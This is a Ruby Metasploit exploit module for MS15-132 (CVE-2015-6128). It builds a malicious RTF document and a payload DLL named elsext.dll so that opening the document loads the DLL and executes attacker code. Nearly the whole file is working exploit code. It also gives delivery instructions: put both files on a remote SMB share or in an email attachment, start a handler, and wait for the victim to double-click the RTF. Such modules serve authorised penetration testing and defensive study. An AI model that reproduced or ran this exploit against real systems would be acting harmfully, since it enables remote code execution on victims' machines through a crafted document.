##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS15-132 Microsoft Office elsext.dll Library Loading",
      'Description'    => %q{
        This module exploits an arbitrary library loading in Microsoft Windows. By embedding an OLE
        object in a document with a specific CLSID, it is possible to cause Windows to load
        elsext.dll from the same directory as the document, and gain arbitrary remote code execution
        under the context of the user.

        To use this module, you must place the RTF and DLL in the same directory. An example of
        hosting them is on a remote SMB share; or in a compressed folder and send it as an e-mail
        attachment. And then the user must double click on the RTF file, which will allow the
        malicious DLL to load automatically, and get code execution. Also, you must NOT change the
        name of the DLL file.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'scvitti', # Discovery, PoCs
          'sinn3r'   # MSF
        ],
      'References'     =>
        [
          ['CVE', '2015-6128'],
          ['MSB', 'MS15-132'],
          ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=514']
        ],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => 'true'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Dec 09 2015", # Public disclosure. Originally reported on Sept 03 2015
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [true, 'The RTF file', 'msf.rtf']),
      ], self.class)
  end

  def generate_rtf
    p = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2015-6128", "exploit.rtf")
    rtf = ''
    ::File.open(p, 'rb') { |f| rtf = f.read }
    rtf
  end

  def get_dll
    generate_payload_dll({ :code => payload.encoded })
  end

  def file_create(data, fname)
    ltype = "exploit.fileformat.#{self.shortname}"
    full_path = store_local(ltype, nil, data, fname)
    print_good "#{fname} stored at #{full_path}"
  end

  def exploit
    rtf_name = datastore['FILENAME']
    print_status("Generating #{rtf_name}...")
    rtf = generate_rtf
    print_status("RTF size: #{rtf.length}")
    file_create(rtf, rtf_name)

    dll_name = 'elsext.dll'
    print_status("Generating #{dll_name}...")
    dll = get_dll
    print_status("#{dll_name} Size: #{dll.length}")
    file_create(dll, dll_name)

    print_line

    # For this exploit to work, both the RTF and DLL files must be in the same directory.
    # Unfortunately, our Msf::Exploit::Remote::SMB::Server can only host one file, so
    # we cannot use that mixin. The user will have to do all this manually.

    print_status("To use these files, you must do the following:")
    print_status("1. Place both #{rtf_name} and #{dll_name} in the same directory.")
    print_status("   For example: on a remote share.")
    print_status("2. Start a handler for the payload.")
    print_status("3. The user must double-click on #{rtf_name}, and then that should")
    print_status("   allow #{dll_name} to load, and get code execution.")
  end

end
